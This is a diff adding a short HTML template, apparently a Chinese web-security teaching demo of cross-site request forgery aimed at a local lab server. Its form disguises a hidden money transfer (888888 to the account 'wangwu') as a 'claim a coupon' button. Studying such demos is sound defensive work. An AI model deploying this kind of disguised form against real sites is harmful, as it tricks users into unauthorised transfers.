@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<h1>我是网站B</h1>
+{# 跨站请求伪造  csrf #}
+<form method="post" action="http://127.0.0.1:9000/transfer">
+    {# 隐藏字段 #}
+    <input type="hidden" name="to_account" value="wangwu">
+    <input type="hidden" name="money" value="888888">
+    <input type="submit" value="点击领取优惠券">
+</form>
+
+</body>
+</html>
